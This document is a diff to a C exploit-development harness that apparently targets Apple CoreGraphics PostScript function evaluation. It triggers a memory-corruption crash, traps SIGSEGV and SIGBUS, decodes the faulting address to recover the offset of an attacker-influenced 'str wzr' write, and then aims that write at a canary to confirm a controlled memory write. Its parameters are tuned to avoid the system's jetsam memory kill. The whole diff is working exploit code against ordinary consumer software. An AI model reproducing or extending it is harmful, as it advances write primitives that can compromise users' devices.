@@ -31722,11 +31722,11 @@ static void r508_7c_only(void) {
     sa_new.sa_flags = SA_SIGINFO;
     sigemptyset(&sa_new.sa_mask);
 
-    /* Test NOUT=2816 (known to hit str wzr,[x22,#0x76c]) with SMALL VPR
-       to minimise PostScript evaluations (nvert = VPR * 2). */
-    int nout_tests[] = {2816, 2816, 2816};
-    int vpr_tests[]  = {2,    4,    8};
-    int ntests = 3;
+    /* VPR=2 NOUT=2816: only 4 vertices, fast eval, avoids jetsam.
+       VPR=2 gives str offset=0 (FAR=1.0 exactly with uniform input). */
+    int nout_tests[] = {2816};
+    int vpr_tests[]  = {2};
+    int ntests = 1;
 
     for (int ti = 0; ti < ntests; ti++) {
         int NOUT = nout_tests[ti];
@@ -31825,16 +31825,17 @@ static void r508_7c_only(void) {
             CGDataProviderRelease(dp); CFRelease(pd);
             free(p); free(fbody); free(rpairs); free(vstream);
         } else {
-            rlog("  A: CRASH FAR=0x%016llx\n", (unsigned long long)r508_fault_addr);
             uint64_t far = r508_fault_addr;
-            /* 1.0 = 0x3FF0000000000000, offset is low bits */
-            if ((far & 0xFFFFFFFFF000ULL) == 0x3FF00000000000ULL) {
-                discovered_offset = far & 0xFFF;
-                rlog("  A: offset = 0x%llx (from FAR = 1.0 + offset)\n",
+            rlog("  A: CRASH FAR=0x%016llx\n", (unsigned long long)far);
+            /* 1.0 = 0x3FF0000000000000. If FAR has 0x3FF in top 12 bits,
+               the offset is in the low bits. offset=0 means str at [x22]. */
+            if ((far >> 48) == 0x3FF0) {
+                discovered_offset = far & 0xFFFF;
+                rlog("  A: offset = 0x%llx (FAR top = 0x3FF0 → 1.0 + offset)\n",
                     (unsigned long long)discovered_offset);
             } else if (far < 0x10000) {
                 discovered_offset = far;
-                rlog("  A: offset = 0x%llx (FAR is small — str wzr at low addr?)\n",
+                rlog("  A: offset = 0x%llx (FAR is small)\n",
                     (unsigned long long)discovered_offset);
             } else {
                 rlog("  A: unexpected FAR pattern\n");
@@ -31844,10 +31845,11 @@ static void r508_7c_only(void) {
         sigaction(SIGBUS, &sa_old_bus, NULL);
         fflush(stdout);
 
-        if (discovered_offset == 0) {
+        if (discovered_offset == 0 && (r508_fault_addr >> 48) != 0x3FF0) {
             rlog("  Skipping canary test — no offset discovered\n\n");
             continue;
         }
+        /* offset=0 is valid when FAR=exactly 1.0 (str at [x22] with no displacement) */
 
         /* Sub-test B: canary targeting with discovered offset */
         static volatile uint32_t canary = 0xCAFEBABE;
